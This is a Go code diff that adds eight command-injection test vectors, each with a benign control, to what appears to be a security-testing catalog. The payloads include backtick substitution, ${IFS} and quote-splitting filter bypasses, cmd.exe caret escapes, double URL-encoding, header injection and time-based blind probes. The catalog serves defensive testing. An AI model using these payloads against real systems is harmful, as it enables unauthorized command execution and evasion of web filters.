@@ -18,6 +18,7 @@ type depthSpec struct {
 	method, path, location, payload, attack string // attack = description of what the request attempts
 	benignPayload, benignDescription        string
 	wstg, top10, source                     string
+	platform                                Platform // empty = not recorded for this vector
 }
 
 func buildDepth(family AttackFamily, cwe string, specs []depthSpec) ([]AttackVector, error) {
@@ -30,6 +31,7 @@ func buildDepth(family AttackFamily, cwe string, specs []depthSpec) ([]AttackVec
 		if err != nil {
 			return nil, fmt.Errorf("%s: %w", s.id, err)
 		}
+		v.Platform = s.platform
 		out = append(out, v)
 	}
 	return out, nil
@@ -155,5 +157,29 @@ func commandInjectionDepthVectors() ([]AttackVector, error) {
 		{id: "CMDI-008", name: "Time-based blind command injection (sleep)", severity: SeverityHigh, preconditions: ping + ", with no command output returned to the client",
 			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8; sleep 5", attack: "delay that proves command execution when nothing is echoed back",
 			benignPayload: "208.67.222.222", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src},
+		{id: "CMDI-009", name: "Windows && chaining with the version command", severity: SeverityCritical, preconditions: ping + ", running on a Windows host",
+			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8 && ver", attack: "double-ampersand list on cmd.exe that runs the harmless Windows version command after a successful ping",
+			benignPayload: "9.9.9.9", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src, platform: PlatformWindows},
+		{id: "CMDI-010", name: "Unix backtick substitution in a ping host", severity: SeverityCritical, preconditions: ping + ", running on a Unix-like host",
+			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8`id`", attack: "backtick substitution inside the host argument, for filters that only look for a semicolon or pipe",
+			benignPayload: "1.0.0.1", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src, platform: PlatformUnix},
+		{id: "CMDI-011", name: "Unix ${IFS} field-separator bypass for space filters", severity: SeverityHigh, preconditions: ping + ", running on a Unix-like host, behind a filter that rejects literal spaces",
+			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8;${IFS}id", attack: "shell variable standing in for a space, so the second command needs no space character",
+			benignPayload: "5.5.5.5", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src, platform: PlatformUnix},
+		{id: "CMDI-012", name: "Unix quote-splitting obfuscation of a command name", severity: SeverityHigh, preconditions: ping + ", running on a Unix-like host, behind a filter that matches the literal command name",
+			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8;i''d", attack: "empty quote pairs inside the command name, which the shell removes before running it, defeating a literal keyword match",
+			benignPayload: "6.6.6.6", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src, platform: PlatformUnix},
+		{id: "CMDI-013", name: "Windows cmd.exe caret-escape obfuscation", severity: SeverityHigh, preconditions: ping + ", running on a Windows host, behind a filter that matches the literal command name",
+			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8 & w^hoami", attack: "caret escape inside the command name, which cmd.exe removes before running it, for a keyword filter",
+			benignPayload: "7.7.7.7", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src, platform: PlatformWindows},
+		{id: "CMDI-014", name: "Double URL-encoded newline in a converter filename", severity: SeverityHigh, preconditions: "target passes a user-supplied filename to a document converter through a shell after one round of URL decoding",
+			method: "GET", path: "/convert", location: "query:file", payload: "report.docx%250aid", attack: "newline encoded twice, so a single decode by the WAF leaves a literal percent-0a that the application's own decoding turns into a line break",
+			benignPayload: "quarterly-report.docx", benignDescription: "ordinary document filename", wstg: wstg, top10: top10Injection, source: src, platform: PlatformUnix},
+		{id: "CMDI-015", name: "Command injection through the User-Agent header in a logging endpoint", severity: SeverityHigh, preconditions: "target's request logger writes the User-Agent header into a shell-invoked log pipeline",
+			method: "POST", path: "/log", location: "header:User-Agent", payload: "Mozilla/5.0;id", attack: "command separator in a request header that the application never treats as input, a location many WAF rule sets do not inspect",
+			benignPayload: "Mozilla/5.0 (X11; Linux x86_64)", benignDescription: "ordinary browser User-Agent string", wstg: wstg, top10: top10Injection, source: src, platform: PlatformAny},
+		{id: "CMDI-016", name: "Windows time-based blind command injection (ping delay)", severity: SeverityHigh, preconditions: ping + ", running on a Windows host, with no command output returned to the client",
+			method: "POST", path: "/ping", location: "body:json:host", payload: "8.8.8.8 & ping -n 6 127.0.0.1", attack: "a roughly five-second delay produced by a loopback ping, proving command execution on Windows when nothing is echoed back",
+			benignPayload: "8.8.8.8", benignDescription: "ordinary host to ping", wstg: wstg, top10: top10Injection, source: src, platform: PlatformWindows},
 	})
 }
